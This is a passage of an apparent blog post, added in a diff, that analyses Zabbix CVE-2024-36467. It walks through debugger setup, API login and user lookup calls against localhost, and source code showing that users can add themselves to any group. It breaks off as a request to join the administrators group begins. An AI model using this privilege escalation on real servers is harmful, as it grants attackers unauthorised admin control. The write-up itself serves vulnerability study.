+<p><img class="center" alt="vscode-launch-json-1" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/vscode-launch-json-1.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Generating<span style="font-family: Courier; font-weight: 600"> .vscode/launch.json</span><br><br></span></p>
+<p>Replace everything in the generated template with the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;0.2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;configurations&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Listen for Xdebug&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;php&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;request&#34;</span>: <span style="color:#e6db74">&#34;launch&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;port&#34;</span>: <span style="color:#ae81ff">9003</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;pathMappings&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;/usr/share/zabbix&#34;</span>: <span style="color:#e6db74">&#34;${workspaceFolder}&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Template<span style="font-family: Courier; font-weight: 600"> .vscode/launch.json</span><br><br></span>
+<h3 id="25-test-breakpoint">2.5 Test Breakpoint</h3>
+<p>Set a test breakpoint at<span style="font-family: Courier; font-weight: 600"> include/classes/api/services/CUser.php:1994 </span> before hitting the play button. This will start our Xdebug listener at port 9003, which will wait for incoming events sent from the <em>zabbix-frontend</em> container.</p>
+<p><img class="center" alt="vscode-debug-test-1" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/vscode-debug-test-1.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Setting Test Breakpoint At<span style="font-family: Courier; font-weight: 600"> include/classes/api/services/CUser.php:1994 </span><br><br></span></p>
+<p>To trigger this test breakpoint, go back to the login page and sign in with any credentials.</p>
+<p><img class="center" alt="vscode-debug-test-2" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/vscode-debug-test-2.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Triggering the Test Breakpoint<br><br></span></p>
+<p>Very nice! We now have full visibility on the variable values and call stack!</p>
+<p>At this very moment, if you feel like you have just been reading a bunch of mumbo-jumbo, it is time to wake the fuck up samurai. We&rsquo;ve got a code base to burn.</p>
+<p><img class="center" alt="cyberpunk" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/cyberpunk.gif"><br></p>
+<h2 id="3-common-api-calls">3. Common API Calls</h2>
+<p>Before I show you the payloads needed to trigger the vulnerabilities, we need to first know how to make API calls.</p>
+<p>Following the <a href="https://www.zabbix.com/documentation/7.0/en/manual/api#performing-requests">Zabbix API Manual</a>, we need to make<span style="font-family: Courier; font-weight: 600"> POST </span>requests to the<span style="font-family: Courier; font-weight: 600"> /api_jsonrpc.php </span>endpoint. Depending on the method, this endpoint will expect different input parameters.</p>
+<p>There are numerous API methods and I would die of old age writing this post if I were to go through every single one of them. Thus, I will only share the two commonly used methods which are <code>user.login</code> and <code>user.get</code>.</p>
+<h3 id="31-userlogin">3.1 user.login</h3>
+<p>Authenticating with valid credentials will grant you a <code>sessionid</code>, which is essential for subsequent API calls.</p>
+<table>
+<tr>
+<th style="text-align: center;">Request</th>
+<th style="text-align: center;">Response</th>
+</tr>
+<tr>
+<td>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">POST</span> <span style="color:#960050;background-color:#1e0010">/api_jsonrpc.php</span> <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host:</span> <span style="color:#960050;background-color:#1e0010">localhost</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">162</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsonrpc&#34;</span>: <span style="color:#e6db74">&#34;2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;user.login&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;params&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;P@ssw0rd123&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></td>
+<td>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Allow-Origin:</span> <span style="color:#960050;background-color:#1e0010">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Allow-Headers:</span> <span style="color:#960050;background-color:#1e0010">Content-Type</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Allow-Methods:</span> <span style="color:#960050;background-color:#1e0010">POST</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Max-Age:</span> <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">68</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsonrpc&#34;</span>: <span style="color:#e6db74">&#34;2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;7f27bc8244c0f417644a461c2565308d&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></td>
+</tr>
+</table>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="table">Getting<span style="font-family: Courier; font-weight: 600"> sessionid </span>Via<span style="font-family: Courier; font-weight: 600"> user.login </span><br><br></span>
+<p>In the output listed above, our <code>sessionid</code> is &ldquo;7f27bc8244c0f417644a461c2565308d&rdquo;, and we will be referencing this authentication token for all our payloads subsequently.</p>
+<p>The following shows the bash command for making the request in Table 3:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;http://localhost/api_jsonrpc.php&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;jsonrpc&#34;: &#34;2.0&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;method&#34;: &#34;user.login&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;params&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;username&#34;: &#34;user&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;password&#34;: &#34;P@ssw0rd123&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    },
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;id&#34;: 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }&#39;</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Bash Command for Curl Request in Table 3<br><br></span>
+<h3 id="32-userget">3.2 user.get</h3>
+<p>This method is just a quick way to grab details about the current user - stuff like <code>userid</code>, <code>username</code>, or whatever else you ask for. You can even filter by <code>username</code> to just get what you only need. The table below demonstrates the request and response of <code>user.get</code>.</p>
+<p><a name="table4"></a></p>
+<table>
+<tr>
+<th style="text-align: center;">Request</th>
+<th style="text-align: center;">Response</th>
+</tr>
+<tr>
+<td>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">POST</span> <span style="color:#960050;background-color:#1e0010">/api_jsonrpc.php</span> <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host:</span> <span style="color:#960050;background-color:#1e0010">localhost</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">203</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsonrpc&#34;</span>: <span style="color:#e6db74">&#34;2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;user.get&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;params&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;output&#34;</span>: [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;userid&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;username&#34;</span>
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;filter&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;auth&#34;</span>: <span style="color:#e6db74">&#34;7f27bc8244c0f417644a461c2565308d&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></td>
+<td>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Allow-Origin:</span> <span style="color:#960050;background-color:#1e0010">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Allow-Headers:</span> <span style="color:#960050;background-color:#1e0010">Content-Type</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Allow-Methods:</span> <span style="color:#960050;background-color:#1e0010">POST</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Max-Age:</span> <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">68</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsonrpc&#34;</span>: <span style="color:#e6db74">&#34;2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;result&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;userid&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></td>
+</tr>
+</table>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="table">Getting<span style="font-family: Courier; font-weight: 600"> userid </span>Via<span style="font-family: Courier; font-weight: 600"> user.get </span><br><br></span>
+<p>The following shows the bash command for making the request in Table 4:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;http://localhost/api_jsonrpc.php&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;jsonrpc&#34;: &#34;2.0&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;method&#34;: &#34;user.get&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;params&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;output&#34;: [&#34;userid&#34;, &#34;username&#34;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;filter&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;username&#34;: &#34;user&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    },
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;id&#34;: 1,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;auth&#34;: &#34;7f27bc8244c0f417644a461c2565308d&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }&#39;</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Bash Command for Curl Request in Table 4<br><br></span>
+<h2 id="4-cve-2024-36467">4. CVE-2024-36467</h2>
+<p>According to <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36467">NIST</a>:</p>
+<blockquote>
+<p><b><em>&ldquo;An authenticated user with API access (e.g.: user with default User role), more specifically a user with access to the user.update API endpoint is enough to be able to add themselves to any group (e.g.: Zabbix Administrators), except to groups that are disabled or having restricted GUI access.&rdquo;</em></b></p>
+</blockquote>
+<p>Well shit&hellip;Considering that Zabbix is quite widely used, having oversights such as this is pretty jarring to me.</p>
+<h3 id="41-static-analysis">4.1 Static Analysis</h3>
+<p>The actual handler for <code>user.update</code> is defined in <span style="font-family: Courier; font-weight: 600">include/classes/api/services/CUser.php</span> from lines 358 to 363. From the listing shown below, the <span style="font-family: Courier; font-weight: 600">CUser::update()</span> function seems to be doing other validation checks in <span style="font-family: Courier; font-weight: 600">CUser::validateUpdate()</span>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">25</span>      <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CUser</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">CApiService</span> {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">358</span>         <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">update</span>(<span style="color:#66d9ef">array</span> $users) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">359</span>             $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">validateUpdate</span>($users, $db_users);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">360</span>             <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">updateForce</span>($users, $db_users);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">361</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">362</span>             <span style="color:#66d9ef">return</span> [<span style="color:#e6db74">&#39;userids&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">array_column</span>($users, <span style="color:#e6db74">&#39;userid&#39;</span>)];
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">363</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Function Definition of <span style="font-family: Courier; font-weight: 600">CUser::update()</span><br><br></span>
+<p>Digging through the function definition of <span style="font-family: Courier; font-weight: 600">CUser::validateUpdate()</span>, we can see that there is only one check that is related to user groups.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">25</span>      <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CUser</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">CApiService</span> {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">371</span>         <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">validateUpdate</span>(<span style="color:#66d9ef">array</span> <span style="color:#f92672">&amp;</span>$users, <span style="color:#66d9ef">array</span> <span style="color:#f92672">&amp;</span>$db_users <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">538</span>             <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">checkUserGroups</span>($users, $db_user_groups, $db_users);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Function Definition of <span style="font-family: Courier; font-weight: 600">CUser::validateUpdate()</span><br><br></span>
+<p>Again, we need to understand what<span style="font-family: Courier; font-weight: 600"> CUser::checkUserGroups() </span> is actually checking. As the analysis of this section of code can be quite long, let&rsquo;s break it down into two parts.</p>
+<p>Firstly, if <code>$db_users</code> is provided and the user has been provisioned from an external directory (<code>userdirectoryid != 0</code>), it rejects this request as it treats the <code>usrgrps</code> as readonly.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">25</span>      <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CUser</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">CApiService</span> {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">777</span>         <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkUserGroups</span>(<span style="color:#66d9ef">array</span> $users, <span style="color:#66d9ef">array</span> <span style="color:#f92672">&amp;</span>$db_user_groups <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">array</span> $db_users <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>)<span style="color:#f92672">:</span> <span style="color:#a6e22e">void</span> {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">780</span>             <span style="color:#66d9ef">foreach</span> ($users <span style="color:#66d9ef">as</span> $i1 <span style="color:#f92672">=&gt;</span> $user) {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">785</span>                 <span style="color:#66d9ef">if</span> ($db_users <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> $db_users[$user[<span style="color:#e6db74">&#39;userid&#39;</span>]][<span style="color:#e6db74">&#39;userdirectoryid&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">786</span>                                         <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">userGroupsChanged</span>($user, $db_users[$user[<span style="color:#e6db74">&#39;userid&#39;</span>]])) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">787</span>                     <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">exception</span>(<span style="color:#a6e22e">ZBX_API_ERROR_PARAMETERS</span>, <span style="color:#a6e22e">_s</span>(<span style="color:#e6db74">&#39;Invalid parameter &#34;%1$s&#34;: %2$s.&#39;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">788</span>                             <span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">.</span>($i1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>),
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">789</span>                             <span style="color:#a6e22e">_s</span>(<span style="color:#e6db74">&#39;cannot update readonly parameter &#34;%1$s&#34; of provisioned user&#39;</span>, <span style="color:#e6db74">&#39;usrgrps&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">790</span>                     ));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">791</span>                 }
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><span style="font-family: Courier; font-weight: 600">CUser::checkUserGroups()</span> 1st Validation<br><br></span>
+<p>Secondly, it also ensures any supplied <code>usrgrpid</code> values actually exist in the <code>usrgrp</code> table</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">25</span>      <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CUser</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">CApiService</span> {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">777</span>         <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkUserGroups</span>(<span style="color:#66d9ef">array</span> $users, <span style="color:#66d9ef">array</span> <span style="color:#f92672">&amp;</span>$db_user_groups <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">array</span> $db_users <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>)<span style="color:#f92672">:</span> <span style="color:#a6e22e">void</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">808</span>             <span style="color:#66d9ef">foreach</span> ($user_group_indexes <span style="color:#66d9ef">as</span> $usrgrpid <span style="color:#f92672">=&gt;</span> $indexes) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">809</span>                 <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">array_key_exists</span>($usrgrpid, $db_user_groups)) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">810</span>                     $i1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>($indexes);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">811</span>                     $i2 <span style="color:#f92672">=</span> $indexes[$i1];
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">812</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">813</span>                      <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">exception</span>(<span style="color:#a6e22e">ZBX_API_ERROR_PARAMETERS</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">814</span>                              <span style="color:#a6e22e">_s</span>(<span style="color:#e6db74">&#39;Invalid parameter &#34;%1$s&#34;: %2$s.&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">.</span>($i1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/usrgrps/&#39;</span><span style="color:#f92672">.</span>($i2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>),
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">815</span>                                      <span style="color:#a6e22e">_</span>(<span style="color:#e6db74">&#39;object does not exist&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">816</span>                              )
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">817</span>                      );
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><span style="font-family: Courier; font-weight: 600">CUser::checkUserGroups()</span> 2nd Validation<br><br></span>
+<p>Basically, that&rsquo;s it&hellip; <span style="font-family: Courier; font-weight: 600">CUser::checkUserGroups()</span> does not actually check whether the user is even allowed to update their own user groups.</p>
+<h3 id="42-dynamic-analysis">4.2 Dynamic Analysis</h3>
+<p>Since there are insufficient checks for adding oneself in any group, we will most definitely want to add ourselves in the <code>Zabbix administrators</code> (<code>usrgrpid = 7</code>) group. If the update is successful, the <code>userid</code> will be seen in the response body.</p>
+<table>
+<tr>
+<th style="text-align: center;">Request</th>
+<th style="text-align: center;">Response</th>
+</tr>
+<tr>
+<td>
+<p>Recall <a href="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/#table1">Section 4.2 Table 1</a> for different <code>usrgrpid</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">POST</span> <span style="color:#960050;background-color:#1e0010">/api_jsonrpc.php</span> <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host:</span> <span style="color:#960050;background-color:#1e0010">localhost</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">190</span>
+</span></span><span style="display:flex;"><span>
